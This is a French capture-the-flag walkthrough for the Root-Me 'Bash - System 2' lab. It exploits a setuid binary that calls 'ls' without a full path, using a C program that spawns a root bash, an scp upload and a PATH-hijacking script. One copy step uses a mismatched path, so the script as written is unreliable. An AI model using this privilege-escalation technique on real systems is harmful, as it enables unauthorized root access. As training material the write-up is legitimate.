# Bash - System 2

1. Code à éxécuter

```
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
 
int main(){
    setreuid(geteuid(), geteuid());
    system("ls -lA /challenge/app-script/ch12/.passwd");
    return 0;
}
```

## Exploitation du code différentes étapes

1. Sur ma machine Linux je décide de crée un exploit qui ouvre un bash en root quand le binaire de mon programme est éxécuté.<br> 

```
nano privesc.c 

int main(){
    setregid(0, 0);
    setreuid(0, 0);

    printf("\nGID :%d", getgid());
    printf(" UID : %d\n", getuid());

    system("/bin/bash");

    printf("\nGID :%d", getgid());
    printf(" UID : %d\n", getuid());

    return 0;
}
```
2. J'envoie le fichier privesc.c sur la machine à rooter

```
scp privesc.c app-script-ch12@challenge02.root-me.org:/tmp
```

3. Préparation d'un script bash qui automatise l'exploitation

```
nano /tmp/flag.sh

#!/bin/bash 
gcc privesc.c -o privesc
mkdir /tmp/tmp1
cd /tmp/tmp1
touch ls
cd ..
cp privesc /tmp1/ls
cd /challenge/app-script/ch12
export PATH=/tmp/tmp1
./ch12
/bin/cat .passwd
```

## Execution

```
cd /tmp
chmod 777 flag.sh
./flag.sh
```